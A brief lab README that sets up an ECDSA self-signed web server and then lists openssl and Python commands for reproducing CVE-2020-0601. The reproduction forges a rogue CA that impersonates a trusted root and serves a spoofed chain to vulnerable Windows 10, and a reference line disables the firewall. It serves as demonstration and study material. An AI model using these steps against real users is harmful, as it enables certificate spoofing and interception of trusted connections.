# ECDSA

## Set up a self-signed web server
- Generate CA key and certificate
	1. openssl ecparam -genkey -name secp384r1 -out myca.key
	2. openssl req -x509 -new -SHA384 -nodes -key myca.key -days 3650 -out myca.crt
- Generate myweb key and certificate
	3. openssl ecparam -genkey -name secp384r1 -out myweb.key
	4. openssl req -new -SHA384 -key myweb.key -nodes -out myweb.csr (it does not matter what values you'll fill but Common Name will be used later.)
	5. openssl x509 -req -SHA384 -days 365 -in myweb.csr -CA myca.crt -CAkey myca.key -CAcreateserial -out myweb.crt
- Run web server and browse the website
	6. python mywebsrv.py  --cert myweb.crt --priv myweb.key
	7. you can browse https://myweb:44330/

## CVE-2020-0601

The following steps are based on the instruction at https://github.com/kudelskisecurity/chainoffools
- Generate rogue CA private key and certificate based on known root CA's public key
	1. curl -o USERTrustECCCertificationAuthority.crt http://www.tbs-x509.com/USERTrustECCCertificationAuthority.crt
	2. curl -o gen-key.py https://raw.githubusercontent.com/kudelskisecurity/chainoffools/master/gen-key.py
	3. openssl ecparam -name secp384r1 -genkey -noout -out p384-key.pem -param_enc explicit
	4. python gen-key.py
	5. openssl req -key p384-key-rogue.pem -new -out ca-rogue.pem -x509 -set_serial 0x5c8b99c55a94c5d27156decd8980cc26 (it does not matter what values you'll fill)
- Sign your web server's certificate with the rogue CA
	6. openssl x509 -req -SHA384 -days 365 -in myweb.csr -CA ca-rogue.pem -CAkey p384-key-rogue.pem -CAcreateserial -out myweb.crt
	7. cat myweb.crt ca-rogue.pem > chain.pem (Need to provide full certificate path)
- Run web server and browse the website
	9. python mywebsrv.py  --cert chain.pem --priv myweb.key
	10. In vulnerable Windows 10, use IE to browse https://myweb:44330/ (host name should match the Common Name you filled when creating myweb.csr)

## Reference
- Use openssl to host a web server. However it won't work for the CVE-2020-0601 scenario
	openssl s_server -key ../self-signed/server.key -cert server.crt -accept 44330 -www
- View certificate
	openssl x509 -in ../../MSECC.cer -text -noout
- I need to stop firewall to make web server accept connection
	sudo service firewalld stop
- Setup ECDSA
	https://www.erianna.com/ecdsa-certificate-authorities-and-certificates-with-openssl/
- Check websites using ECDSA
	https://security.stackexchange.com/questions/58603/are-any-major-websites-offering-ecdsa-authentication

